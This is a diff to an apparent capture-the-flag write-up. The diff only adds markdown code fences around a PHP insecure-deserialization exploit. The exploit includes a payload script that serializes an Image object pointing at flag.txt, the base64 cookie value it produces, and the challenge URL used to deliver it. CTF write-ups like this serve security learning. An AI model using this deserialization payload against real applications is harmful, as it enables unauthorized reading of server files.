@@ -12,6 +12,7 @@ View.php does this $imageObj = unserialize(base64_decode($_COOKIE['image_data'])
 Then it calls:  
 file_get_contents($imageObj->path)
 # payload script to generate the base64 encoded string for image cookie
+~~~
 <?php
 class Image {
     public $path = '/var/www/html/flag.txt'; // Common CTF flag location
@@ -21,12 +22,16 @@ class Image {
 $payload = serialize(new Image());
 echo base64_encode($payload) . "\n";
 ?>
+~~~
  Then run:
  php payload.php 
 Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjIyOiIvdmFyL3d3dy9odG1sL2ZsYWcudHh0Ijt9
 Then add cookie in the website header:
+~~~
 http://1k3h22c9.chals.mctf.io/view.php?set_image=Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjIyOiIvdmFyL3d3dy9odG1sL2ZsYWcudHh0Ijt9
+~~~
 After the flag is viewed from the view source
+~~~
 <body>
     <div class="view-container">
         <h1 class="mb-4">Photo Viewer</h1>
@@ -38,3 +43,4 @@ After the flag is viewed from the view source
     </div>
 </body>
 </html>
+~~~
